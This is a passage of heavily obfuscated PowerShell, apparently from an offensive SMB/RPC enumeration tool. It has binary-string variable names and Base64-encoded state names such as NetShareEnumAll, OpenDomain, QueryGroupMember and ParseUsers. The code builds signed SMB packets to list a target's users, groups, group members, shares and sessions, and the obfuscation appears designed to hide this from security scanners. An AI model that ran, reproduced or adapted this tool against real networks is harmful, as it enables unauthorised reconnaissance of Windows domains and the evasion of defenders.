                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBlAHQAUwBoAGEAcgBlAEUAbgB1AG0AQQBsAGwA')))
                    {
                        ${01000100011101010}++
                        ${10010110101010100} = ${10010111110010011}
                        ${00011010101110011} = _01000000010000001 0x0b,0x00 0x01,0x00 ${10010001011010000} ${01000100011101010} ${01101100100111010} ${10111010000000010} ${10111101001010100}
                        ${00110011110110010} = _00000100101000000 $Target
                        ${10010010101110000} = _00010011110111111 ${00110011110110010} 
                        ${01111100101100101} = _10010000011010010 0x17,0xc0,0x11,0x00 ${01101100101001101} ${10010010101110000}.Length 4280
                        ${00111000011010010} = _10000100010100110 0x03 ${10010010101110000}.Length 0 0 0x02,0x00,0x00,0x00 0x00,0x00 0x0f,0x00
                        ${00110000110010110} = _00010011110111111 ${00111000011010010}
                        ${10100010000101011} = _00010011110111111 ${00011010101110011}
                        ${10111100010001110} = _00010011110111111 ${01111100101100101} 
                        ${10000000001000000} = ${10111100010001110}.Length + ${00110000110010110}.Length + ${10010010101110000}.Length
                        ${01011111100010011} = _10110111001100010 ${10100010000101011}.Length ${10000000001000000}
                        ${01000010010000100} = _00010011110111111 ${01011111100010011}
                        if(${10010001011010000})
                        {
                            ${01110000100100001} = ${10100010000101011} + ${10111100010001110} + ${00110000110010110} + ${10010010101110000}
                            ${01110000000000011} = ${10010101111010000}.ComputeHash(${01110000100100001})
                            ${01110000000000011} = ${01110000000000011}[0..15]
                            ${00011010101110011}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAGcAbgBhAHQAdQByAGUA')))] = ${01110000000000011}
                            ${10100010000101011} = _00010011110111111 ${00011010101110011}
                        }
                        ${00111101101010000} = ${01000010010000100} + ${10100010000101011} + ${10111100010001110} + ${00110000110010110} + ${10010010101110000}
                        ${10010111110010011} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAG4AZABSAGUAYwBlAGkAdgBlAA==')))
                    }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBwAGUAbgBBAGwAaQBhAHMA')))
                    {  
                        ${01000100011101010}++
                        ${10010110101010100} = ${10010111110010011}
                        ${00011010101110011} = _01000000010000001 0x0b,0x00 0x01,0x00 ${10010001011010000} ${01000100011101010} ${01101100100111010} ${10111010000000010} ${10111101001010100}
                        ${10000000000000011} = _01101101101011101 ${01001101100110111} ${00010011101010010}
                        ${00000100000001100} = _00010011110111111 ${10000000000000011} 
                        ${00111000011010010} = _10000100010100110 0x03 ${00000100000001100}.Length 0 0 0x0c,0x00,0x00,0x00 0x00,0x00 0x1b,0x00
                        ${01111100101100101} = _10010000011010010 0x17,0xc0,0x11,0x00 ${01101100101001101} ${00000100000001100}.Length 4280
                        ${00110000110010110} = _00010011110111111 ${00111000011010010}
                        ${10100010000101011} = _00010011110111111 ${00011010101110011}
                        ${10111100010001110} = _00010011110111111 ${01111100101100101} 
                        ${10000000001000000} = ${10111100010001110}.Length + ${00110000110010110}.Length + ${00000100000001100}.Length
                        ${01011111100010011} = _10110111001100010 ${10100010000101011}.Length ${10000000001000000}
                        ${01000010010000100} = _00010011110111111 ${01011111100010011}
                        if(${10010001011010000})
                        {
                            ${01110000100100001} = ${10100010000101011} + ${10111100010001110} + ${00110000110010110} + ${00000100000001100}
                            ${01110000000000011} = ${10010101111010000}.ComputeHash(${01110000100100001})
                            ${01110000000000011} = ${01110000000000011}[0..15]
                            ${00011010101110011}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAGcAbgBhAHQAdQByAGUA')))] = ${01110000000000011}
                            ${10100010000101011} = _00010011110111111 ${00011010101110011}
                        }
                        ${00111101101010000} = ${01000010010000100} + ${10100010000101011} + ${10111100010001110} + ${00110000110010110} + ${00000100000001100}
                        ${10010111110010011} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAG4AZABSAGUAYwBlAGkAdgBlAA==')))
                    }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBwAGUAbgBEAG8AbQBhAGkAbgA=')))
                    {    
                        ${01000100011101010}++
                        ${10010110101010100} = ${10010111110010011}
                        ${00011010101110011} = _01000000010000001 0x0b,0x00 0x01,0x00 ${10010001011010000} ${01000100011101010} ${01101100100111010} ${10111010000000010} ${10111101001010100}
                        ${10000000000000011} = _01110010100011010 ${10000101110111000} ${01000001110011011} ${01101001100111110}
                        ${00000100000001100} = _00010011110111111 ${10000000000000011} 
                        ${01111100101100101} = _10010000011010010 0x17,0xc0,0x11,0x00 ${01101100101001101} ${00000100000001100}.Length 4280
                        ${00111000011010010} = _10000100010100110 0x03 ${00000100000001100}.Length 0 0 0x07,0x00,0x00,0x00 0x00,0x00 0x07,0x00
                        ${00110000110010110} = _00010011110111111 ${00111000011010010}
                        ${10100010000101011} = _00010011110111111 ${00011010101110011}
                        ${10111100010001110} = _00010011110111111 ${01111100101100101} 
                        ${10000000001000000} = ${10111100010001110}.Length + ${00110000110010110}.Length + ${00000100000001100}.Length
                        ${01011111100010011} = _10110111001100010 ${10100010000101011}.Length ${10000000001000000}
                        ${01000010010000100} = _00010011110111111 ${01011111100010011}
                        if(${10010001011010000})
                        {
                            ${01110000100100001} = ${10100010000101011} + ${10111100010001110} + ${00110000110010110} + ${00000100000001100}
                            ${01110000000000011} = ${10010101111010000}.ComputeHash(${01110000100100001})
                            ${01110000000000011} = ${01110000000000011}[0..15]
                            ${00011010101110011}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAGcAbgBhAHQAdQByAGUA')))] = ${01110000000000011}
                            ${10100010000101011} = _00010011110111111 ${00011010101110011}
                        }
                        ${00111101101010000} = ${01000010010000100} + ${10100010000101011} + ${10111100010001110} + ${00110000110010110} + ${00000100000001100}
                        ${10010111110010011} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAG4AZABSAGUAYwBlAGkAdgBlAA==')))
                    }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBwAGUAbgBHAHIAbwB1AHAA')))
                    {
                        ${01000100011101010}++
                        ${10010110101010100} = ${10010111110010011}
                        ${00011010101110011} = _01000000010000001 0x0b,0x00 0x01,0x00 ${10010001011010000} ${01000100011101010} ${01101100100111010} ${10111010000000010} ${10111101001010100}
                        ${10000000000000011} = _10100000010000110 ${01001101100110111} ${00010011101010010}
                        ${00000100000001100} = _00010011110111111 ${10000000000000011} 
                        ${00111000011010010} = _10000100010100110 0x03 ${00000100000001100}.Length 0 0 0x09,0x00,0x00,0x00 0x00,0x00 0x13,0x00
                        ${01111100101100101} = _10010000011010010 0x17,0xc0,0x11,0x00 ${01101100101001101} ${00000100000001100}.Length 4280
                        ${00110000110010110} = _00010011110111111 ${00111000011010010}
                        ${10100010000101011} = _00010011110111111 ${00011010101110011}
                        ${10111100010001110} = _00010011110111111 ${01111100101100101} 
                        ${10000000001000000} = ${10111100010001110}.Length + ${00110000110010110}.Length + ${00000100000001100}.Length
                        ${01011111100010011} = _10110111001100010 ${10100010000101011}.Length ${10000000001000000}
                        ${01000010010000100} = _00010011110111111 ${01011111100010011}
                        if(${10010001011010000})
                        {
                            ${01110000100100001} = ${10100010000101011} + ${10111100010001110} + ${00110000110010110} + ${00000100000001100}
                            ${01110000000000011} = ${10010101111010000}.ComputeHash(${01110000100100001})
                            ${01110000000000011} = ${01110000000000011}[0..15]
                            ${00011010101110011}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAGcAbgBhAHQAdQByAGUA')))] = ${01110000000000011}
                            ${10100010000101011} = _00010011110111111 ${00011010101110011}
                        }
                        ${00111101101010000} = ${01000010010000100} + ${10100010000101011} + ${10111100010001110} + ${00110000110010110} + ${00000100000001100}
                        ${10010111110010011} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAG4AZABSAGUAYwBlAGkAdgBlAA==')))
                    }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABhAHIAcwBlAEwAbwBvAGsAdQBwAFIAaQBkAHMA')))
                    {
                        [Byte[]]${00000000100001011} = ${10110001011001111}[140..143]
                        ${10110101011001101} = [System.BitConverter]::ToInt16(${00000000100001011},0)
                        ${10011010000100110} = ${10110101011001101} * 8 + 164
                        ${00011000000011100} = ${10011010000100110}
                        ${01111110111001000} = 152
                        ${10001100000000011} = @()
                        ${01001011000100110} = @()
                        ${01000011110101111} = @()
                        ${10101100010100000} = 0
                        while(${10101100010100000} -lt ${10110101011001101})
                        {
                            [Byte[]]${01111110001000111} = ${10110001011001111}[${01111110111001000}..(${01111110111001000} + 1)]
                            ${10010011001001111} = [System.BitConverter]::ToInt16(${01111110001000111},0)
                            ${00011000000011100} = ${10011010000100110} + ${10010011001001111}
                            [Byte[]]${10010011001010011} = ${10110001011001111}[(${10011010000100110} - 4)..(${10011010000100110} - 1)]
                            ${10000001111000010} = [System.BitConverter]::ToInt16(${10010011001010011},0)
                            [Byte[]]${00110101001000110} = ${10110001011001111}[${10011010000100110}..(${00011000000011100} - 1)]
                            if(${10000001111000010} % 2)
                            {
                                ${10011010000100110} += ${10010011001001111} + 14
                            }
                            else
                            {
                                ${10011010000100110} += ${10010011001001111} + 12
                            }
                            ${01100001111001100} = [System.BitConverter]::ToString(${00110101001000110})
                            ${01100001111001100} = ${01100001111001100} -replace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LQAwADAA'))),""
                            ${01100001111001100} = ${01100001111001100}.Split("-") | %{[Char][System.Convert]::ToInt16($_,16)}
                            ${01100001111001100} = New-Object System.String (${01100001111001100},0,${01100001111001100}.Length)
                            ${01001011000100110} += ${01100001111001100}
                            ${01111110111001000} = ${01111110111001000} + 8
                            ${10101100010100000}++
                        }
                        ${10010010101101001} = ${10110001011001111}[(${00011000000011100} + 14)..(${00011000000011100} + 13 + (${10110101011001101} * 4))]
                        ${01001100110010110} = 0
                        for(${10101100010100000} = 0; ${10101100010100000} -lt ${10110101011001101}; ${10101100010100000}++)
                        {  
                            ${10010010111100111} = ${10010010101101001}[(${01001100110010110}..(${01001100110010110} + 3))]
                            ${01001100110010110} += 4
                            ${00010100101101010} = [System.BitConverter]::ToInt16(${10010010111100111},0)
                            if(${00010100101101010} -eq 1)
                            {
                                ${01000011110101111} += $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dQBzAGUAcgA=')))
                            }
                            else
                            {
                                ${01000011110101111} += $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZwByAG8AdQBwAA==')))
                            }
                        }
                        ${10101100010100000} = 0
                        ForEach(${01101110000000000} in ${01001011000100110})
                        {
                            ${00001001101001100} = New-Object PSObject
                            Add-Member -InputObject ${00001001101001100} -MemberType NoteProperty -Name Username ${01101110000000000}
                            Add-Member -InputObject ${00001001101001100} -MemberType NoteProperty -Name Type ${01000011110101111}[${10101100010100000}]
                            ${10001100000000011} += ${00001001101001100}
                            ${10101100010100000}++
                        }
                        if($Action -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBsAGwA'))) -or $TargetShow)
                        {
                            echo $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABUAGEAcgBnAGUAdAAgACQARwByAG8AdQBwACAAVQBzAGUAcgBzADoA')))
                        }
                        echo ${10001100000000011} | sort -property Username |ft -AutoSize
                        ${10010111110010011} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBsAG8AcwBlAFIAZQBxAHUAZQBzAHQA')))
                    }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABhAHIAcwBlAEwAbwBvAGsAdQBwAFMAaQBkAHMA')))
                    {
                        [Byte[]]${01001111111010000} = ${10110001011001111}[144..147]
                        ${10100111110011110} = [System.BitConverter]::ToInt16(${01001111111010000},0)
                        ${00100001000110011} = ${10100111110011110} * 12 + 172
                        ${01010101110111111} = ${00100001000110011}
                        ${01010000100000011} = 160
                        ${01000001001111001} = @()
                        ${10101100010100000} = 0
                        while(${10101100010100000} -lt ${10100111110011110})
                        {
                            [Byte[]]${00000101100010011} = ${10110001011001111}[${01010000100000011}..(${01010000100000011} + 1)]
                            ${01110111110011111} = [System.BitConverter]::ToInt16(${00000101100010011},0)
                            ${01010101110111111} = ${00100001000110011} + ${01110111110011111}
                            [Byte[]]${10010011001010011} = ${10110001011001111}[(${00100001000110011} - 4)..(${00100001000110011} - 1)]
                            ${10000001111000010} = [System.BitConverter]::ToInt16(${10010011001010011},0)
                            [Byte[]]${00101010101001110} = ${10110001011001111}[${00100001000110011}..(${01010101110111111} - 1)]
                            if(${10000001111000010} % 2)
                            {
                                ${00100001000110011} += ${01110111110011111} + 42
                            }
                            else
                            {
                                ${00100001000110011} += ${01110111110011111} + 40
                            }
                            ${10110111110001100} = [System.BitConverter]::ToString(${00101010101001110})
                            ${10110111110001100} = ${10110111110001100} -replace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LQAwADAA'))),""
                            ${10110111110001100} = ${10110111110001100}.Split("-") | %{[Char][System.Convert]::ToInt16($_,16)}
                            ${10110111110001100} = New-Object System.String (${10110111110001100},0,${10110111110001100}.Length)
                            ${01000001001111001} += ${10110111110001100}
                            ${01010000100000011} = ${01010000100000011} + 12
                            ${10101100010100000}++
                        }
                        [Byte[]]${00000000100001011} = ${10110001011001111}[(${00100001000110011} - 4)..(${00100001000110011} - 1)]         
                        ${10110101011001101} = [System.BitConverter]::ToInt16(${00000000100001011},0)
                        ${10011010000100110} = ${10110101011001101} * 16 + ${00100001000110011} + 12
                        ${00011000000011100} = ${10011010000100110}
                        ${01111110111001000} = ${00100001000110011} + 4
                        ${10001100000000011} = @()
                        ${10101100010100000} = 0
                        while(${10101100010100000} -lt ${10110101011001101})
                        {
                            ${00001001101001100} = New-Object PSObject
                            [Byte[]]${10010010111100111} = ${10110001011001111}[(${01111110111001000} - 4)]
                            [Byte[]]${01111110001000111} = ${10110001011001111}[${01111110111001000}..(${01111110111001000} + 1)]
                            ${10010011001001111} = [System.BitConverter]::ToInt16(${01111110001000111},0)
                            ${10101101101111001} = ${01111110111001000} + 8
                            [Byte[]]${10111100001110101} = ${10110001011001111}[${10101101101111001}..(${10101101101111001} + 3)]
                            ${01001100101000000} = [System.BitConverter]::ToInt16(${10111100001110101},0)
                            ${00011000000011100} = ${10011010000100110} + ${10010011001001111}
                            [Byte[]]${10010011001010011} = ${10110001011001111}[(${10011010000100110} - 4)..(${10011010000100110} - 1)]
                            ${10000001111000010} = [System.BitConverter]::ToInt16(${10010011001010011},0)
                            [Byte[]]${00110101001000110} = ${10110001011001111}[${10011010000100110}..(${00011000000011100} - 1)]
                            if(${10000001111000010} % 2)
                            {
                                ${10011010000100110} += ${10010011001001111} + 14
                            }
                            else
                            {
                                ${10011010000100110} += ${10010011001001111} + 12
                            }
                            if(${10010010111100111} -eq 1)
                            {
                                ${00010100101101010} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dQBzAGUAcgA=')))
                            }
                            else
                            {
                                ${00010100101101010} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZwByAG8AdQBwAA==')))
                            }
                            ${01100001111001100} = [System.BitConverter]::ToString(${00110101001000110})
                            ${01100001111001100} = ${01100001111001100} -replace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LQAwADAA'))),""
                            ${01100001111001100} = ${01100001111001100}.Split("-") | %{[Char][System.Convert]::ToInt16($_,16)}
                            ${01100001111001100} = New-Object System.String (${01100001111001100},0,${01100001111001100}.Length)
                            Add-Member -InputObject ${00001001101001100} -MemberType NoteProperty -Name Username ${01100001111001100}
                            Add-Member -InputObject ${00001001101001100} -MemberType NoteProperty -Name Domain ${01000001001111001}[${01001100101000000}]
                            Add-Member -InputObject ${00001001101001100} -MemberType NoteProperty -Name Type ${00010100101101010}
                            ${01111110111001000} = ${01111110111001000} + 16
                            ${10001100000000011} += ${00001001101001100}
                            ${10101100010100000}++
                        }
                        if($Action -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBsAGwA'))) -or $TargetShow)
                        {
                            echo $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABUAGEAcgBnAGUAdAAgACQARwByAG8AdQBwACAARwByAG8AdQBwACAATQBlAG0AYgBlAHIAcwA6AA==')))
                        }
                        echo ${10001100000000011} | sort -property Username |ft -AutoSize
                        ${10010111110010011} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBsAG8AcwBlAFIAZQBxAHUAZQBzAHQA')))
                    }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABhAHIAcwBlAFMAUgBWAFMAVgBDAA==')))
                    {
                        ${10101000011010100} = @()
                        ${10011101011100100} = @()
                        [Byte[]]${01000111110010111} = ${10110001011001111}[152..155]
                        ${10001101001000001} = [System.BitConverter]::ToInt32(${01000111110010111},0)
                        ${10011010001001011} = 164
                        ${10101100010100000} = 0
                        while(${10101100010100000} -lt ${10001101001000001})
                        {
                            if(${10101100010100000} -gt 0)
                            {
                                if(${00001001001110001} % 2)
                                {
                                    ${10011010001001011} += ${00001001001110001} * 2 + 2
                                }
                                else
                                {
                                    ${10011010001001011} += ${00001001001110001} * 2
                                }
                            }
                            else
                            {
                                if(${01011011111111111} -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBoAGEAcgBlAA=='))))
                                {
                                    ${10011010001001011} += ${10001101001000001} * 12
                                }
                                else
                                {
                                    ${10011010001001011} += ${10001101001000001} * 16
                                }
                            }
                            ${00011100110000000} = New-Object PSObject
                            [Byte[]]${00011101001011110} = ${10110001011001111}[${10011010001001011}..(${10011010001001011} + 3)]
                            ${00001001001110001} = [System.BitConverter]::ToInt32(${00011101001011110},0)
                            ${10011010001001011} += 12
                            [Byte[]]${10110011000111001} = ${10110001011001111}[(${10011010001001011})..(${10011010001001011} + (${00001001001110001} * 2 - 1))]
                            ${01101111100111000} = [System.BitConverter]::ToString(${10110011000111001})
                            ${01101111100111000} = ${01101111100111000} -replace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LQAwADAA'))),""
                            ${01101111100111000} = ${01101111100111000}.Split("-") | %{[Char][System.Convert]::ToInt16($_,16)}
                            ${01101111100111000} = New-Object System.String (${01101111100111000},0,${01101111100111000}.Length)
                            if(${00001001001110001} % 2)
                            {
                                ${10011010001001011} += ${00001001001110001} * 2 + 2
                            }
                            else
                            {
                                ${10011010001001011} += ${00001001001110001} * 2
                            }
                            [Byte[]]${00011101001011110} = ${10110001011001111}[${10011010001001011}..(${10011010001001011} + 3)]
                            ${00001001001110001} = [System.BitConverter]::ToInt32(${00011101001011110},0)
                            ${10011010001001011} += 12
                            [Byte[]]${01100110110001100} = ${10110001011001111}[(${10011010001001011})..(${10011010001001011} + (${00001001001110001} * 2 - 1))]
                            ${01101101001100010} = [System.BitConverter]::ToString(${01100110110001100})
                            ${01101101001100010} = ${01101101001100010} -replace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LQAwADAA'))),""
                            ${01101101001100010} = ${01101101001100010}.Split("-") | %{[Char][System.Convert]::ToInt16($_,16)}
                            ${01101101001100010} = New-Object System.String (${01101101001100010},0,${01101101001100010}.Length)
                            if(${01011011111111111} -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBoAGEAcgBlAA=='))))
                            {
                                ${10011101011100100} += ${01101111100111000}
                                Add-Member -InputObject ${00011100110000000} -MemberType NoteProperty -Name Share ${01101111100111000}
                                Add-Member -InputObject ${00011100110000000} -MemberType NoteProperty -Name Description ${01101101001100010}
                                Add-Member -InputObject ${00011100110000000} -MemberType NoteProperty -Name $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAGMAZQBzAHMAIABNAGEAcwBrAA=='))) ""
                            }
                            else
                            {
                                Add-Member -InputObject ${00011100110000000} -MemberType NoteProperty -Name Username ${01101101001100010}
                                Add-Member -InputObject ${00011100110000000} -MemberType NoteProperty -Name Source ${01101111100111000}
                            }
                            ${10101000011010100} += ${00011100110000000}
                            ${10101100010100000}++
                        }
                        if($Action -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBsAGwA'))) -and ${01011011111111111} -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBoAGEAcgBlAA=='))))
                        {
                            echo $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABUAGEAcgBnAGUAdAAgAFMAaABhAHIAZQBzADoA')))
                        }
                        elseif($Action -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBsAGwA'))) -and ${01011011111111111} -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBlAHQAUwBlAHMAcwBpAG8AbgA='))) -or $TargetShow)
                        {
                            echo $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABUAGEAcgBnAGUAdAAgAE4AZQB0AFMAZQBzAHMAaQBvAG4AcwA6AA==')))
                        }
                        if(${01011011111111111} -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBlAHQAUwBlAHMAcwBpAG8AbgA='))))
                        {
                            echo ${10101000011010100} | sort -property Share |ft -AutoSize
                        }
                        ${10010111110010011} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBsAG8AcwBlAFIAZQBxAHUAZQBzAHQA')))
                    }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABhAHIAcwBlAFUAcwBlAHIAcwA=')))
                    {
                        [Byte[]]${00000000100001011} = ${10110001011001111}[148..151]
                        ${10110101011001101} = [System.BitConverter]::ToInt16(${00000000100001011},0)
                        ${10011010000100110} = ${10110101011001101} * 12 + 172
                        ${00011000000011100} = ${10011010000100110}
                        ${00111011111101111} = 160
                        ${01111110111001000} = 164
                        ${10001100000000011} = @()
                        ${10101100010100000} = 0
                        while(${10101100010100000} -lt ${10110101011001101})
                        {
                            ${00001001101001100} = New-Object PSObject
                            [Byte[]]${01111110001000111} = ${10110001011001111}[${01111110111001000}..(${01111110111001000} + 1)]
                            ${10010011001001111} = [System.BitConverter]::ToInt16(${01111110001000111},0)
                            [Byte[]]${10010111101110000} = ${10110001011001111}[${00111011111101111}..(${00111011111101111} + 3)]
                            ${10110001010000111} = [System.BitConverter]::ToInt16(${10010111101110000},0)
                            ${00011000000011100} = ${10011010000100110} + ${10010011001001111}
                            [Byte[]]${10010011001010011} = ${10110001011001111}[(${10011010000100110} - 4)..(${10011010000100110} - 1)]
                            ${10000001111000010} = [System.BitConverter]::ToInt16(${10010011001010011},0)
                            [Byte[]]${00110101001000110} = ${10110001011001111}[${10011010000100110}..(${00011000000011100} - 1)]
                            if(${10000001111000010} % 2)
                            {
                                ${10011010000100110} += ${10010011001001111} + 14
                            }
                            else
                            {
                                ${10011010000100110} += ${10010011001001111} + 12
                            }
                            ${01100001111001100} = [System.BitConverter]::ToString(${00110101001000110})
                            ${01100001111001100} = ${01100001111001100} -replace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LQAwADAA'))),""
                            ${01100001111001100} = ${01100001111001100}.Split("-") | %{[Char][System.Convert]::ToInt16($_,16)}
                            ${01100001111001100} = New-Object System.String (${01100001111001100},0,${01100001111001100}.Length)
                            Add-Member -InputObject ${00001001101001100} -MemberType NoteProperty -Name Username ${01100001111001100}
                            Add-Member -InputObject ${00001001101001100} -MemberType NoteProperty -Name RID ${10110001010000111}
                            ${01111110111001000} = ${01111110111001000} + 12
                            ${00111011111101111} = ${00111011111101111} + 12
                            ${10001100000000011} += ${00001001101001100}
                            ${10101100010100000}++
                        }
                        if($Action -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBsAGwA'))) -or $TargetShow)
                        {
                            echo $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABUAGEAcgBnAGUAdAAgAFUAcwBlAHIAcwA6AA==')))
                        }
                        echo ${10001100000000011} | sort -property Username |ft -AutoSize
                        ${10010111110010011} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBsAG8AcwBlAFIAZQBxAHUAZQBzAHQA')))
                    }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UQB1AGUAcgB5AEcAcgBvAHUAcABNAGUAbQBiAGUAcgA=')))
                    {
                        ${01000100011101010}++
                        ${10010110101010100} = ${10010111110010011}
                        ${00011010101110011} = _01000000010000001 0x0b,0x00 0x01,0x00 ${10010001011010000} ${01000100011101010} ${01101100100111010} ${10111010000000010} ${10111101001010100}
                        ${10000000000000011} = _10001011010001110 ${10010111111011110}
                        ${00000100000001100} = _00010011110111111 ${10000000000000011} 
                        ${00111000011010010} = _10000100010100110 0x03 ${00000100000001100}.Length 0 0 0x10,0x00,0x00,0x00 0x00,0x00 0x19,0x00
                        ${01111100101100101} = _10010000011010010 0x17,0xc0,0x11,0x00 ${01101100101001101} ${00000100000001100}.Length 4280
                        ${00110000110010110} = _00010011110111111 ${00111000011010010}
                        ${10100010000101011} = _00010011110111111 ${00011010101110011}
                        ${10111100010001110} = _00010011110111111 ${01111100101100101} 
                        ${10000000001000000} = ${10111100010001110}.Length + ${00110000110010110}.Length + ${00000100000001100}.Length
                        ${01011111100010011} = _10110111001100010 ${10100010000101011}.Length ${10000000001000000}
                        ${01000010010000100} = _00010011110111111 ${01011111100010011}
                        if(${10010001011010000})
                        {
                            ${01110000100100001} = ${10100010000101011} + ${10111100010001110} + ${00110000110010110} + ${00000100000001100}
                            ${01110000000000011} = ${10010101111010000}.ComputeHash(${01110000100100001})
                            ${01110000000000011} = ${01110000000000011}[0..15]
                            ${00011010101110011}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAGcAbgBhAHQAdQByAGUA')))] = ${01110000000000011}
                            ${10100010000101011} = _00010011110111111 ${00011010101110011}
                        }
                        ${00111101101010000} = ${01000010010000100} + ${10100010000101011} + ${10111100010001110} + ${00110000110010110} + ${00000100000001100}
                        ${10010111110010011} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAG4AZABSAGUAYwBlAGkAdgBlAA==')))
                    }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UQB1AGUAcgB5AEkAbgBmAG8AUgBlAHEAdQBlAHMAdAA=')))
                    {          
                        ${01000100011101010}++
                        ${10010110101010100} = ${10010111110010011}
                        ${00011010101110011} = _01000000010000001 0x10,0x00 0x01,0x00 ${10010001011010000} ${01000100011101010} ${01101100100111010} ${10111010000000010} ${10111101001010100}
                        ${01111100101100101} = _10000101100001110 0x01 0x05 0x18,0x00,0x00,0x00 0x68,0x00 ${01101100101001101}
                        ${10100010000101011} = _00010011110111111 ${00011010101110011}
                        ${10111100010001110} = _00010011110111111 ${01111100101100101}    
                        ${01011111100010011} = _10110111001100010 ${10100010000101011}.Length ${10111100010001110}.Length
                        ${01000010010000100} = _00010011110111111 ${01011111100010011}
                        if(${10010001011010000})
                        {
                            ${01110000100100001} = ${10100010000101011} + ${10111100010001110} 
                            ${01110000000000011} = ${10010101111010000}.ComputeHash(${01110000100100001})
                            ${01110000000000011} = ${01110000000000011}[0..15]
                            ${00011010101110011}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAGcAbgBhAHQAdQByAGUA')))] = ${01110000000000011}
                            ${10100010000101011} = _00010011110111111 ${00011010101110011}
                        }
                        ${00111101101010000} = ${01000010010000100} + ${10100010000101011} + ${10111100010001110}
                        ${10010111110010011} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAG4AZABSAGUAYwBlAGkAdgBlAA==')))
                    }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGEAZABSAGUAcQB1AGUAcwB0AA==')))
                    {
                        sleep -m $Sleep
                        ${01000100011101010}++
                        ${10010110101010100} = ${10010111110010011}
                        ${00011010101110011} = _01000000010000001 0x08,0x00 0x01,0x00 ${10010001011010000} ${01000100011101010} ${01101100100111010} ${10111010000000010} ${10111101001010100}
                        ${01111100101100101} = _01011011010110110 ${01101100101001101}
                        ${01111100101100101}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABlAG4AZwB0AGgA')))] = 0x00,0x04,0x00,0x00
                        ${10100010000101011} = _00010011110111111 ${00011010101110011}
                        ${10111100010001110} = _00010011110111111 ${01111100101100101} 
                        ${01011111100010011} = _10110111001100010 ${10100010000101011}.Length ${10111100010001110}.Length
                        ${01000010010000100} = _00010011110111111 ${01011111100010011}
                        if(${10010001011010000})
                        {
                            ${01110000100100001} = ${10100010000101011} + ${10111100010001110} 
                            ${01110000000000011} = ${10010101111010000}.ComputeHash(${01110000100100001})
                            ${01110000000000011} = ${01110000000000011}[0..15]
                            ${00011010101110011}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAGcAbgBhAHQAdQByAGUA')))] = ${01110000000000011}
                            ${10100010000101011} = _00010011110111111 ${00011010101110011}
                        }
                        ${00111101101010000} = ${01000010010000100} + ${10100010000101011} + ${10111100010001110} 
                        ${10010111110010011} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAG4AZABSAGUAYwBlAGkAdgBlAA==')))
                    }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBQAEMAQgBpAG4AZAA=')))
                    {
                        ${01000100011101010}++
                        ${10010110101010100} = ${10010111110010011}
